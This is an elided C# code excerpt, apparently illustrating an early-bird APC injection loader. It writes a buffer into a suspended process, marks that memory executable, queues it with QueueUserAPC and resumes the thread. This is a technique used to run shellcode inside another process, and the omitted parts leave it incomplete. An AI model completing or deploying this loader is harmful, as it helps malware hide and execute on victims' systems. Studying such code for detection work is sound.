...
namespace SystemTest
{
    public class Program
    {
        static void Main(string[] args)
        {
            ...
            success = writeProcessMemory(pi.hProcess, alloc, buf, (uint)buf.Length, out UIntPtr bytesWritten);
            if (success == false) {
                goto Fail;
            }
            ...
            uint oldProtect = 0;
            success = virtualProtectEx(pi.hProcess, alloc, buf.Length, 0x20, out oldProtect);
            if (success == false) {
                goto Fail;
            }
            ...
            IntPtr outPtr = queueUserAPC(alloc, tpointer, IntPtr.Zero);
            ...
            uint rOut = resumeThread(pi.hThread);
            if (rOut != 1) {
                goto Fail;
            }
